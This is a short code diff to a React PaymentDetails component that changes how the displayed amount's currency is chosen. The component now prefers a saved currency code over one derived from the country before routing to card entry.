@@ -32,11 +32,12 @@ const PaymentDetails = () => {
   // Get country code from link data
   const countryCode = shippingInfo?.selectedCountry || "SA";
 
-  // Get currency info for display
-  const currencyInfo = getCurrencyByCountry(countryCode);
-
   // Get payment data from link data
   const paymentData = shippingInfo?.payment_data;
+
+  // Get currency code - prioritize saved currency code from data
+  const savedCurrencyCode = paymentData?.currency_code || shippingInfo?.currency_code;
+  const currencyCodeToUse = savedCurrencyCode || getCurrencyByCountry(countryCode).code;
 
   // Get amount from payment data or shipping info
   const rawAmount = paymentData?.payment_amount || shippingInfo?.cod_amount || shippingInfo?.payment_amount;
@@ -54,8 +55,8 @@ const PaymentDetails = () => {
     }
   }
 
-  // Format amount with currency symbol and name
-  const formattedAmount = formatCurrency(amount, countryCode);
+  // Format amount with the dynamic currency code
+  const formattedAmount = formatCurrency(amount, currencyCodeToUse);
   
   const handleProceed = () => {
     navigate(`/pay/${id}/card-input`);
